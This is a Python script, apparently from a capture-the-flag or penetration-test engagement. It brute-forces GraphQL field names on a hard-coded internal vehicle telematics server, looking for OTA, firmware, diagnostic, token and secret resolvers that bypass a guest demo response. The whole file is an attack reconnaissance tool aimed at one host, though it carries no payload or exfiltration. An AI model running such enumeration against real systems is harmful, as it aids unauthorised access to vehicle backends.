"""E6: /graphql 字段名穷举。
判据：若解析器按「字段名 -> 数据源」分派，真实字段会返回非 demo body；否则全部 demo。
输出：任何 DIFF 立刻打印（这就是入口）。
"""
import json, urllib.request, urllib.error, hashlib, time

URL = "http://10.230.164.2:8080/graphql"
DEMO = '{"data":{"vehicles":[{"label":"Guest demo vehicle","vin":"CV6000000DEMO0001"}]}}'
VIN = "CV6FF52FEE9EDDD86"

BASE = """vehicle vehicles ota otas campaign campaigns firmware firmwares package packages
artifact artifacts engineering diagnostics diagnostic session sessions image images update
updates release releases manifest manifests signature signatures key keys bundle bundles job
jobs task tasks ecu ecus gateway gateways dtc dtcs telemetry fleet fleets config configs
token tokens user users account accounts tenant tenants node nodes edge edges file files
download downloads url urls version versions build builds deploy deploys rollout rollouts
target targets group groups policy policies rule rules permission permissions role roles
audit audits log logs event events alert alerts report reports status info meta admin debug
internal secret secrets cert certs crt pki sign verify hash digest blob storage bucket
vehicleOta vehicleOtaCampaign vehicleCampaigns vehiclePackages vehicleDiagnostics
otaCampaigns otaCampaign otaPackage otaPackages otaArtifacts otaEngineering otaJob otaJobs
otaManifest otaSignature otaFirmware otaRelease otaTarget otaTargets otaStatus
campaignPackages campaignArtifacts campaignTargets campaignStatus
firmwarePackages firmwareArtifacts firmwareManifest firmwareSignature
engineeringArtifacts engineeringPackages engineeringResources
diagnosticSessions diagnosticSession diagnosticEntry diagnosticEntries
diagnosticsSession diagEntry diagEntries diagSession diagSessions
currentVehicle myVehicle myVehicles myFleet guestVehicles
""".split()

PAIR_A = "vehicle ota campaign firmware package artifact diagnostic engineering session update".split()
names = set(BASE)
for a in PAIR_A:
    for b in PAIR_A:
        names.add(a + b[0].upper() + b[1:])
names |= {n + "s" for n in list(names) if not n.endswith("s")}
names |= {"get" + n[0].upper() + n[1:] for n in list(names)}
names = sorted(names)

def post(q):
    body = json.dumps({"query": q}).encode()
    r = urllib.request.Request(URL, data=body, headers={"Content-Type": "application/json"}, method="POST")
    try:
        with urllib.request.urlopen(r, timeout=8) as resp:
            return resp.status, resp.read().decode("utf-8", "replace").strip()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace").strip()
    except Exception as e:
        return -1, str(e)

diffs, n = [], 0
t0 = time.time()
for name in names:
    for q in (f"{{{name}}}", f'{{{name}(vin:"{VIN}"){{id}}}}'):
        code, bd = post(q)
        n += 1
        if bd != DEMO:
            diffs.append({"name": name, "query": q, "status": code, "body": bd[:400]})
            print("DIFF", q, code, bd[:200], flush=True)
print(f"probed {n} queries over {len(names)} names in {time.time()-t0:.1f}s ; diffs={len(diffs)}")
json.dump({"names": len(names), "queries": n, "diffs": diffs},
          open(r"D:\qwb\03_EVIDENCE\tsp\0206_e6_fieldname_brute.json", "w", encoding="utf-8"), ensure_ascii=False, indent=1)
